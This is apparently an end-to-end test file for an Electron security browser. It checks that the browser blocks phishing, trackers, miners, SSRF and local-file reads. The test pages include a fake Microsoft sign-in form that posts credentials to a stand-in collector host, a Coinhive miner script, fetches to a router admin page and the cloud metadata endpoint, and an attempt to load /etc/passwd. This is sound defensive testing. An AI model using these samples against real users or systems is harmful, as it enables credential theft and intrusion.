'use strict';
/**
 * End-to-end functional test of the running browser.
 *
 * Boots the real app, serves a set of pages from a local HTTP server, drives a
 * real tab at them, and checks that the analyst, the firewall and the download
 * sandbox behave in the live application rather than only in unit tests.
 *
 *   xvfb-run -a npx electron tools/functional-test.js
 */

const { app, BrowserWindow } = require('electron');
const http = require('http');
const fs = require('fs');
const path = require('path');
const os = require('os');

const OUT = process.env.SHADOW_FUNCTIONAL_OUT || path.join(os.tmpdir(), 'shadow-functional.json');
const checks = [];
const record = (name, pass, detail) => {
  checks.push({ name, pass, detail });
  console.log(`[${pass ? 'PASS' : 'FAIL'}] ${name}${detail ? ` :: ${detail}` : ''}`);
};

const shadow = require('../src/main/main.js');

// --------------------------------------------------------------------------
// Test pages
// --------------------------------------------------------------------------
const PAGES = {
  '/clean': `<!doctype html><title>Bread Recipes</title>
    <h1>Sourdough</h1><p>Mix flour, water and salt. Wait.</p>`,

  // Brand impersonation plus a password field: the deep page scan should
  // condemn this once it renders, even though the URL itself is unremarkable.
  '/phish': `<!doctype html><title>Microsoft account sign in</title>
    <h1>Sign in to your Microsoft account</h1>
    <form action="https://collector.evil.tk/harvest" method="post">
      <input type="email" name="email"><input type="password" name="password">
      <button>Sign in</button>
    </form>`,

  // Pulls a known tracker and a known miner: the firewall should drop both.
  '/trackers': `<!doctype html><title>News</title><h1>Article</h1>
    <script src="https://www.google-analytics.com/analytics.js"></script>
    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
    <img src="https://doubleclick.net/pixel.gif">`,

  // Tries to reach the local network from a page, which is the SSRF case.
  '/ssrf': `<!doctype html><title>Probe</title><h1>Probe</h1>
    <script>
      fetch('http://192.168.1.1/admin').catch(()=>{});
      fetch('http://169.254.169.254/latest/meta-data/').catch(()=>{});
    </script>`,
};

let server;
let base;

function startServer() {
  return new Promise((resolve) => {
    server = http.createServer((req, res) => {
      const body = PAGES[req.url.split('?')[0]];
      if (body === undefined) { res.writeHead(404); res.end('nope'); return; }
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end(body);
    });
    server.listen(0, '127.0.0.1', () => {
      base = `http://127.0.0.1:${server.address().port}`;
      resolve();
    });
  });
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/** Load a URL in the first tab the way the address bar does. */
async function visit(view, url, waitMs = 2500) {
  shadow.firewall.noteUserNavigation(url);
  try { await view.webContents.loadURL(url); } catch { /* a block aborts the load */ }
  await sleep(waitMs);
  return view.webContents.getURL();
}

app.whenReady().then(async () => {
  await startServer();
  await sleep(4000);   // let the window and first tab come up

  const win = BrowserWindow.getAllWindows()[0];
  if (!win) { record('browser window exists', false); return finish(); }
  record('browser window exists', true, `title "${win.getTitle()}"`);

  const [chromeView, tabView] = win.contentView.children;
  record('chrome UI and a tab are both present', Boolean(chromeView && tabView),
    `${win.contentView.children.length} views`);

  // --- 1. A clean page loads and renders ----------------------------------
  await visit(tabView, `${base}/clean`);
  const cleanTitle = await tabView.webContents.executeJavaScript('document.title', true).catch(() => null);
  record('a clean page loads and renders', cleanTitle === 'Bread Recipes', `title: ${cleanTitle}`);

  const cleanVerdict = shadow.analyzer.inspectPage({
    url: `${base}/clean`,
    html: await tabView.webContents.executeJavaScript('document.documentElement.outerHTML', true).catch(() => ''),
  });
  record('the analyst allows the clean page', cleanVerdict.verdict === 'allow',
    `${cleanVerdict.verdict} ${cleanVerdict.score}/100`);

  // --- 2. The phishing page is caught by the live deep scan ----------------
  await visit(tabView, `${base}/phish`, 3500);
  const landedOn = tabView.webContents.getURL();
  const showedInterstitial = landedOn.includes('interstitial.html');
  record('the live deep scan blocks the phishing page', showedInterstitial,
    `tab ended on ${path.basename(landedOn.split('?')[0])}`);

  if (showedInterstitial) {
    // Not just "did the page appear". A block page that renders its static
    // defaults, with a score of 0 and no findings, has failed at the one job
    // it has. That is exactly what happened when the firewall was blocking
    // the page's own script as a file:// subresource.
    const headline = await tabView.webContents
      .executeJavaScript('document.getElementById("headline").textContent', true).catch(() => null);
    const score = await tabView.webContents
      .executeJavaScript('document.getElementById("score").textContent', true).catch(() => null);
    const findings = await tabView.webContents
      .executeJavaScript('document.getElementById("findings").children.length', true).catch(() => 0);
    const firstFinding = await tabView.webContents
      .executeJavaScript('(document.querySelector("#findings h3")||{}).textContent||""', true).catch(() => '');

    record('the block page loaded its own script', Number(score) > 0,
      `score rendered as ${score}`);
    record('the block page lists why it blocked', Number(findings) > 0,
      `${findings} finding(s), first: "${String(firstFinding).slice(0, 60)}"`);
    record('the block page has a headline', Boolean(headline), String(headline));
  }

  // --- 3. The firewall drops trackers and miners ---------------------------
  const before = shadow.firewall.stats.blocked;
  await visit(tabView, `${base}/trackers`, 3000);
  const blockedNow = shadow.firewall.stats.blocked - before;
  const blockedHosts = shadow.firewall.recentBlocks.slice(0, 10).map((b) => b.hostname);
  record('the firewall blocks trackers and miners on a live page', blockedNow >= 2,
    `${blockedNow} blocked: ${[...new Set(blockedHosts)].join(', ')}`);
  record('the cryptominer specifically was blocked',
    blockedHosts.some((h) => h.includes('coinhive')), blockedHosts.join(', '));

  // --- 4. Local-network reachability --------------------------------------
  //
  // The test page is itself served from 127.0.0.1, and a page already on the
  // local network is allowed to talk to the local network. That matches the
  // web platform's own Private Network Access model, where loopback is the
  // most private context and may reach less private ones. The public-page
  // case, which is the one that matters, is covered in test/firewall.test.js.
  //
  // Cloud metadata is the exception: it is refused from anywhere, including
  // from a local page, because nothing legitimate in a browser reads it.
  const beforeSsrf = shadow.firewall.stats.byCategory.ssrf || 0;
  await visit(tabView, `${base}/ssrf`, 3000);
  const ssrfBlocked = (shadow.firewall.stats.byCategory.ssrf || 0) - beforeSsrf;
  const metadataBlocked = shadow.firewall.recentBlocks.some((b) => b.reason === 'metadata');
  record('cloud metadata is refused even from a local page', metadataBlocked,
    `${ssrfBlocked} local-network request(s) blocked`);

  // The same firewall, asked directly about a public page reaching the LAN.
  const { decideRequest, parseRequest } = require('../src/main/firewall/firewall.js');
  const publicToLan = decideRequest(
    parseRequest({ url: 'http://192.168.1.1/admin', referrer: 'https://example.com/', resourceType: 'xhr' }),
    { settings: shadow.settings, blocklists: shadow.blocklists, rules: [] });
  record('a public page is refused the local network', publicToLan.action === 'block',
    `${publicToLan.action} / ${publicToLan.reason}`);

  // --- 5. Dangerous schemes are refused in the live app -------------------
  // This goes straight to loadURL, deliberately bypassing the navigation gate,
  // to prove the protocol-level confinement holds on its own.
  let passwdBody = null;
  try { await tabView.webContents.loadURL('file:///etc/passwd'); } catch { /* refused */ }
  await sleep(1200);
  try {
    passwdBody = await tabView.webContents.executeJavaScript('document.body.innerText.slice(0,200)', true);
  } catch { passwdBody = null; }
  const leaked = Boolean(passwdBody && /root:.*:0:0:/.test(passwdBody));
  record('a tab cannot read /etc/passwd even bypassing the navigation gate', !leaked,
    leaked ? `LEAKED: ${passwdBody.slice(0, 60)}` : `served instead: ${String(passwdBody).slice(0, 60)}`);

  // Shadow's own pages must still load, or the browser has no UI.
  const internal = path.join(__dirname, '..', 'src', 'renderer', 'home.html');
  await visit(tabView, `file://${internal}`, 1500);
  const homeTitle = await tabView.webContents.executeJavaScript('document.title', true).catch(() => null);
  record('Shadow\'s own pages still load', homeTitle === 'Shadow', `title: ${homeTitle}`);

  // --- 6. The hardened session is the one rendering ------------------------
  const { session } = require('electron');
  const ua = session.fromPartition('persist:shadow-web').getUserAgent();
  record('the generic User-Agent is in force', !/Electron|Shadow/i.test(ua), ua.slice(0, 60) + '...');

  // --- 7. The fingerprint shield reached the page's own world -------------
  await visit(tabView, `${base}/clean`, 2500);
  const fp = await tabView.webContents.executeJavaScript(
    'JSON.stringify({cores:navigator.hardwareConcurrency,mem:navigator.deviceMemory,'
    + 'wd:navigator.webdriver,depth:screen.colorDepth,batt:typeof navigator.getBattery,'
    + 'shield:!!window.__shadowShield})', true).catch((e) => `error: ${e.message}`);
  let fpOk = false;
  try {
    const v = JSON.parse(fp);
    fpOk = v.shield === true && v.cores === 8 && v.depth === 24 && v.batt === 'undefined';
  } catch { /* reported below */ }
  record('the fingerprint shield is active in the page world', fpOk, fp);

  // --- 8. The SOC log recorded the session --------------------------------
  const stats = shadow.events.stats();
  record('the SOC log recorded what happened',
    stats.total > 0 && stats.blocked > 0,
    `${stats.total} events, ${stats.blocked} firewall blocks, ${stats.pagesBlocked} pages blocked`);

  // --- 9. Screenshot of the actual chrome UI ------------------------------
  try {
    const png = await chromeView.webContents.capturePage();
    const shot = path.join(path.dirname(OUT), 'shadow-ui.png');
    fs.writeFileSync(shot, png.toPNG());
    const size = fs.statSync(shot).size;
    record('the browser UI renders', size > 5000, `${shot} (${size} bytes)`);
  } catch (e) {
    record('the browser UI renders', false, e.message);
  }

  finish();
});

function finish() {
  const passed = checks.filter((c) => c.pass).length;
  const summary = { passed, total: checks.length, checks };
  fs.writeFileSync(OUT, JSON.stringify(summary, null, 2));
  console.log(`\n${passed}/${checks.length} functional checks passed`);
  if (server) server.close();
  app.exit(passed === checks.length ? 0 : 1);
}
